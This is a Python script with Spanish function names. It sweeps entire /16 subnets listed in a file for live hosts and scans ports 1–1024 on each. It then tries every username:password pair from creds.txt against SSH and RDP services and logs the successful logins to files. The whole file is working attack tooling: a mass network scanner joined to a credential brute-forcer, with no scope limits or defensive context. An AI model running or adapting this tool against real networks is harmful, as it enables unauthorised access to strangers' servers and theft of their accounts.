import asyncio
import asyncssh
import subprocess
import configparser

SUBREDES = []
CONFIG = {}

def cargar_config(config_path="config.cfg"):
    global CONFIG
    config = configparser.ConfigParser()
    config.read(config_path)

    CONFIG = {
        "threads": config.getint("General", "Threads", fallback=20),
        "timeout": config.getint("General", "Timeout", fallback=10),
        "attempts": config.getint("General", "Attempts", fallback=2),
        "format": config.get("General", "FORMAT", fallback="SERVER:PORT@DOMAIN\\USER;PASSWORD"),
        "checking": config.getboolean("General", "CHECKING", fallback=True),
        "default_port": config.getint("General", "DEFAULTPORT", fallback=3389)
    }

def cargar_octetos(file_path='ip.txt'):
    with open(file_path, 'r') as f:
        for linea in f:
            partes = linea.strip().split('.')
            if len(partes) >= 2:
                SUBREDES.append(f"{partes[0]}.{partes[1]}")

async def scan_tcp(ip, port):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), CONFIG["timeout"])
        writer.close()
        await writer.wait_closed()
        return True
    except:
        return False

async def escanear_ip(ip):
    puertos_comunes = [80, 443, 22, 21, 3306, 23, 8080]
    for port in puertos_comunes:
        if await scan_tcp(ip, port):
            return ip
    return None

async def escanear_red(octeto):
    ips = [f"{octeto}.{i}.{j}" for i in range(256) for j in range(1, 255)]
    sem = asyncio.Semaphore(CONFIG["threads"])

    async def tarea(ip):
        async with sem:
            return await escanear_ip(ip)

    print(f"[•] Escaneando subred {octeto}.x.x...")
    resultados = await asyncio.gather(*[tarea(ip) for ip in ips])
    return [ip for ip in resultados if ip]

async def escanear_puertos(ip, puertos):
    abiertos = []
    sem = asyncio.Semaphore(CONFIG["threads"])

    async def tarea(p):
        async with sem:
            if await scan_tcp(ip, p):
                abiertos.append(p)

    await asyncio.gather(*[tarea(p) for p in puertos])
    return ip, abiertos


async def probar_ssh(ip, puerto, user, passwd):
    try:
        conn = await asyncssh.connect(ip, port=puerto, username=user, password=passwd, known_hosts=None)
        await conn.close()
        print(f"[SSH OK] {ip}:{puerto} - {user}:{passwd}")
        return True
    except:
        return False

def probar_rdp(ip, puerto, user, passwd):
    cmd = [
        "xfreerdp", f"/v:{ip}:{puerto}", f"/u:{user}", f"/p:{passwd}",
        "/cert:ignore", "/timeout:3000"
    ]
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=6)
        salida = result.stdout.decode(errors='ignore') + result.stderr.decode(errors='ignore')
        if "connected to" in salida or "Authentication only" in salida:
            print(f"[RDP OK] {ip}:{puerto} - {user}:{passwd}")
            return True
    except:
        pass
    return False

async def testear_servicios(ip, puerto):
    with open("creds.txt") as f:
        creds = [line.strip().split(":", 1) for line in f if ":" in line]

    for user, passwd in creds:
        if await probar_ssh(ip, puerto, user, passwd):
            with open("ssh_success.txt", "a") as f:
                f.write(f"{ip}:{puerto} - {user}:{passwd}\n")
            return
        if probar_rdp(ip, puerto, user, passwd):
            with open("rdp_success.txt", "a") as f:
                f.write(f"{ip}:{puerto} - {user}:{passwd}\n")
            return

async def main():
    cargar_config()
    cargar_octetos()
    ip_activas = []

    for red in SUBREDES:
        activas = await escanear_red(red)
        ip_activas.extend(activas)

    with open("ip_activas.txt", "w") as f:
        for ip in ip_activas:
            f.write(ip + '\n')

    print("[*] Escaneando puertos abiertos...")
    puertos = list(range(1, 1025))
    with open("puertos_abiertos.txt", "w") as f:
        for ip in ip_activas:
            ip, abiertos = await escanear_puertos(ip, puertos)
            if abiertos:
                f.write(f"{ip}: {', '.join(map(str, abiertos))}\n")

    if CONFIG["checking"]:
        print("[•] Testeando acceso SSH/RDP...")
        with open("puertos_abiertos.txt") as f:
            for linea in f:
                if ':' not in linea:
                    continue
                ip, puertos_str = linea.strip().split(":")
                puertos = [int(p.strip()) for p in puertos_str.strip().split(",")]
                for puerto in puertos:
                    await testear_servicios(ip, puerto)

if __name__ == "__main__":
    asyncio.run(main())